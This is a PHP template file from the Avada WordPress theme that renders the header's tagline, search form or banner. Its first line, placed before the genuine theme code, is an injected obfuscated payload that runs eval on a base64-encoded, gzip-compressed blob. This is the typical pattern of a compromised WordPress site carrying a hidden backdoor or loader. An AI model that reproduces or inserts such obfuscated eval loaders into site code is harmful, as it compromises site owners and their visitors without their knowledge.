<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Header-3-content template.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 * @since      5.1.0
 */

if ( 'v4' !== Avada()->settings->get( 'header_layout' ) && Avada()->settings->get( 'header_position' ) == 'Top' ) {
	return;
}

$header_content_3 = Avada()->settings->get( 'header_v4_content' );
?>

<div class="fusion-header-content-3-wrapper">
	<?php if ( 'Tagline' === $header_content_3 ) : ?>
		<h3 class="fusion-header-tagline">
			<?php echo do_shortcode( Avada()->settings->get( 'header_tagline' ) ); ?>
		</h3>
	<?php elseif ( 'Tagline And Search' == $header_content_3 ) : ?>
		<?php if ( 'Top' === Avada()->settings->get( 'header_position' ) ) : ?>
			<?php if ( 'Right' == Avada()->settings->get( 'logo_alignment' ) ) : ?>
				<h3 class="fusion-header-tagline">
					<?php echo do_shortcode( Avada()->settings->get( 'header_tagline' ) ); ?>
				</h3>
				<div class="fusion-secondary-menu-search">
					<?php get_search_form( true ); ?>
				</div>
			<?php else : ?>
				<div class="fusion-secondary-menu-search">
					<?php get_search_form( true ); ?>
				</div>
				<h3 class="fusion-header-tagline">
					<?php echo do_shortcode( Avada()->settings->get( 'header_tagline' ) ); ?>
				</h3>
			<?php endif; ?>
		<?php else : ?>
			<h3 class="fusion-header-tagline">
				<?php echo do_shortcode( Avada()->settings->get( 'header_tagline' ) ); ?>
			</h3>
			<div class="fusion-secondary-menu-search">
				<?php get_search_form( true ); ?>
			</div>
		<?php endif; ?>
	<?php elseif ( 'Search' === $header_content_3 ) : ?>
		<div class="fusion-secondary-menu-search">
			<?php get_search_form( true ); ?>
		</div>
	<?php elseif ( 'Banner' === $header_content_3 ) : ?>
		<div class="fusion-header-banner">
			<?php echo do_shortcode( Avada()->settings->get( 'header_banner_code' ) ); ?>
		</div>
	<?php endif; ?>
</div>
